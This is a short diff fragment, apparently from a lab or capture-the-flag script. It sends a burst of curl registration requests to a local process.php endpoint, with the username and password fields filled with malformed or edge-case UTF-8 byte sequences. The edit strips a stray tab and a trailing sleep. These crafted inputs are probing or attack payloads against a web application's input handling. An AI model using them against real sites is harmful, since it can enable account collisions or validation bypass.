@@ -66,4 +66,4 @@ curl -sS "10.1.5.2/process.php?user=%EF%B7%AF&pass=%EF%B7%AF&drop=register" & sl
 
 curl -sS "10.1.5.2/process.php?user=%F0%BF%BF%BF&pass=%F0%BF%BF%BF&drop=register" & sleep 1
 
-curl -sS "10.1.5.2/process.php?user=%ED%AD%BF	%ED%B0%80&pass=%ED%AD%BF	%ED%B0%80&drop=register" & sleep 1
+curl -sS "10.1.5.2/process.php?user=%ED%AD%BF%ED%B0%80&pass=%ED%AD%BF%ED%B0%80&drop=register"
